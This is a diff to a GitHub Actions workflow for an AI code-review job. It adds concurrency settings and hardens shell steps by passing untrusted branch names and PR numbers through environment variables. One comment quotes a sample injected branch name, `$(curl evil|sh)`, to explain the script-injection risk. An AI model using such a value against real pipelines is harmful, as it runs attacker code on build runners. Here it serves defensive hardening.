@@ -89,6 +89,12 @@ jobs:
   adversarial-review:
     name: Adversarial review (5-axis)
     runs-on: [self-hosted, claude-review]   # dedicated always-on claude reviewers (fury + artemis), NOT a build runner
+    # Job-scoped dedup (NOT workflow-scoped): collapses the push+PR double-run so we don't
+    # race the comment upsert or double-spend claude. Safe because this job is NOT a required
+    # check, so a cancelled run here can't block the merge (unlike the required Compile job).
+    concurrency:
+      group: advrev-${{ github.head_ref || github.ref_name }}
+      cancel-in-progress: true
     timeout-minutes: 25
     permissions:
       contents: read
@@ -107,9 +113,13 @@ jobs:
           private-key: ${{ secrets.AUTOFIX_APP_PRIVATE_KEY }}
 
       - name: Compute PR diff (merge-base vs default branch, same on push + PR)
+        env:
+          # via env, never inline ${{ }} into the shell (branch names are untrusted — CWE-94)
+          BASE_REF: ${{ github.base_ref }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
         run: |
-          BASE="${{ github.base_ref }}"
-          [ -z "$BASE" ] && BASE="${{ github.event.repository.default_branch }}"
+          BASE="$BASE_REF"
+          [ -z "$BASE" ] && BASE="$DEFAULT_BRANCH"
           [ -z "$BASE" ] && BASE=main
           # Hard-fail (→ gate fails closed) rather than under-reviewing to HEAD~1: an
           # unresolvable base could hide a malicious earlier commit behind a benign tip.
@@ -144,13 +154,17 @@ jobs:
           GH_TOKEN: ${{ steps.apptoken.outputs.token }}
           REPO: ${{ github.repository }}
           OWNER: ${{ github.repository_owner }}
+          # Pass via env, never inline ${{ }} into the shell — a branch name like
+          # `$(curl evil|sh)` would otherwise be script-injected (CWE-94) on the runner.
+          REF: ${{ github.ref_name }}
+          PR_NUM: ${{ github.event.pull_request.number }}
         run: |
           # Never clobber a prior good comment with an empty body if no report was produced.
           [ -s advrev.md ] || { echo "no report produced — leaving any prior comment intact"; exit 0; }
-          PR="${{ github.event.pull_request.number }}"
+          PR="$PR_NUM"
           if [ -z "$PR" ]; then
             # owner-qualified head so a fork's same-named branch can't resolve to the wrong PR
-            PR=$(gh pr list -R "$REPO" --head "$OWNER:${{ github.ref_name }}" --state open --json number -q '.[0].number' 2>/dev/null)
+            PR=$(gh pr list -R "$REPO" --head "$OWNER:$REF" --state open --json number -q '.[0].number' 2>/dev/null)
           fi
           [ -z "$PR" ] && { echo "no open PR for this ref — skipping comment"; exit 0; }
           { echo '<!-- adversarial-review -->'; cat advrev.md; } > body.md
